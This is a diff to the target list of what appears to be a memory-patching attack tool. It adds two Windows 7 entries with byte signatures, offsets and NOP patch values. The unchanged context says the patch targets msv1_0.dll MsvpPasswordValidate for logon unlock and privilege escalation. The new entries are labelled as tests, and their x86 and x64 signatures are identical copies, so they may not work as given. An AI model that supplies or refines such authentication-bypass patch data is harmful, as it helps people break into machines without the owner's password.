@@ -147,7 +147,35 @@ memdump_ext = 'bin'             # Binary extesnion for memory dumps
 #
 #===============================================================================
 
-targets = [{'OS': 'Windows 8',
+targets = [{'OS': 'Windows 7',
+            'versions': ['SP1'],
+            'architectures': ['x86'],
+            'name': 'msvp1_0 test',
+            'notes': 'w00t',
+            'signatures': [{'offsets': [0x268],
+                            'chunks': [{'chunk': 0x90909090908bff558bec81ec,
+                                        'internaloffset': 0x00,
+                                        'patch': 0x90,
+                                        'patchoffset': 0x29},
+                                       {'chunk': 0x53, # push ebx
+                                        'internaloffset': 0x20},
+                                       {'chunk': 0x5657, # push esi; push edi
+                                        'internaloffset': 0x27}]}]},
+           {'OS': 'Windows 7',
+            'versions': ['SP1'],
+            'architectures': ['x64'],
+            'name': 'lsass.exe test',
+            'notes': 'w00t',
+            'signatures': [{'offsets': [0x268],
+                            'chunks': [{'chunk': 0x90909090908bff558bec81ec,
+                                        'internaloffset': 0x00,
+                                        'patch': 0x90,
+                                        'patchoffset': 0x29},
+                                       {'chunk': 0x53, # push ebx
+                                        'internaloffset': 0x20},
+                                       {'chunk': 0x5657, # push esi; push edi
+                                        'internaloffset': 0x27}]}]},
+           {'OS': 'Windows 8',
             'versions': ['8.0', '8.1'],
             'architectures': ['x86', 'x64'],
             'name': 'msv1_0.dll MsvpPasswordValidate unlock/privilege escalation',
